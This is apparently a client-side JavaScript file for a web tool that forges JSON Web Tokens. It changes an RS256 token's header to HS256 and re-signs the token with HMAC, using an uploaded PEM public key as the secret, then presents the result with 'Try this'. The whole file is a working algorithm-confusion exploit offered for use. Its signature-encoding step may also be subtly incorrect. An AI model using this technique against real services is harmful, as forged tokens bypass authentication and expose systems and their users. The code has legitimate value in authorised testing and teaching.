(function() {
  const submitButton = document.getElementById("btn-submit-crack");
  submitButton.addEventListener("click", crackJWT);
  document.getElementById("input-file").addEventListener("change", getFile);

  function crackJWT() {
    const token = document.getElementById("token").value;
    const result = document.getElementById("new-token");
    //const pem = document.addEventListener("change", getFile);
    let keyFromPemFile = `${document.getElementById("content-target").value}`;

    let newHeader, newSignature;
    let newToken, unsignedToken;
    let tokenSplit = token.split(".");
    let header = tokenSplit[0];
    let payload = tokenSplit[1];
    //let tokenSignature = tokenSplit[2];
    let algorithm = checkAlgorithm(atob(header));

    if (!algorithm) {
      newToken = false;
    } else {
      newHeader = changeAlgorithmInHeader(atob(header));
      //newHeader = btoa(newHeader);
      newHeader = base64Encoding(newHeader);
      unsignedToken = `${newHeader}.${payload}`;
      newSignature = CryptoJS.HmacSHA256(unsignedToken, keyFromPemFile);
      newSignature = base64Encoding(newSignature);
      newToken = `${unsignedToken}.${newSignature}`;
    }
    printResult(newToken, result);
  }

  /**
   * Printing the result to the user
   * @param {*} token
   * @param {*} result
   */
  function printResult(token, result) {
    if (!token) {
      result.className = `alert alert-danger`;
      result.textContent = "The token is not signed with RS256 algorithm";
    } else {
      result.className = `alert alert-success`;
      result.textContent = `Try this: ${token}`;
    }
    return;
  }

  /**
   * Check the algorithm from the token's header
   * @param {*} decodedHeader
   */
  function checkAlgorithm(decodedHeader) {
    return decodedHeader.includes("RS256");
  }

  /**
   * Change the algorithm from the token's header from 'RS256' to 'HS256'
   * @param {*} decodedHeader
   */
  function changeAlgorithmInHeader(decodedHeader) {
    let changedHeader = decodedHeader;
    const regexFindRS = /(RS256)/;
    changedHeader = changedHeader.replace(regexFindRS, "HS256");

    return changedHeader;
  }

  /**
   * Ensure correct base64 encoding
   * @param {*} decodedValue
   */
  function base64Encoding(decodedValue) {
    let encodedValue;
    let wordarray = CryptoJS.enc.Utf8.parse(decodedValue);
    encodedValue = CryptoJS.enc.Base64.stringify(wordarray);
    encodedValue = encodedValue
      .replace(/=+$/, "")
      .replace(/\+/g, "-")
      .replace(/\//g, "_");

    return encodedValue;
  }

  /**
   * Get the file content
   * @param {*} event
   */
  function getFile(event) {
    const input = event.target;
    const target = document.getElementById("content-target");
    if ("files" in input && input.files.length > 0) {
      let reader = new FileReader();
      reader.readAsText(input.files[0]);
      reader.onload = function(evt) {
        target.textContent = `${evt.target.result}`;
      };
      reader.onerror = function(evt) {
        target.textContent = "Oops, something wrong happend ;(";
      };
    }
  }

  // function getFile(event) {
  //   const input = event.target;
  //   if ("files" in input && input.files.length > 0) {
  //     placeFileContent(
  //       document.getElementById("content-target"),
  //       input.files[0]
  //     );
  //   }
  // }

  // function placeFileContent(target, file) {
  //   readFileContent(file)
  //     .then(content => {
  //       target.value = content;
  //     })
  //     .catch(error => console.log(error));
  // }

  // function readFileContent(file) {
  //   const reader = new FileReader();
  //   return new Promise((resolve, reject) => {
  //     reader.onload = event => resolve(event.target.result);
  //     reader.onerror = error => reject(error);
  //     reader.readAsText(file);
  //   });
  // }
})();
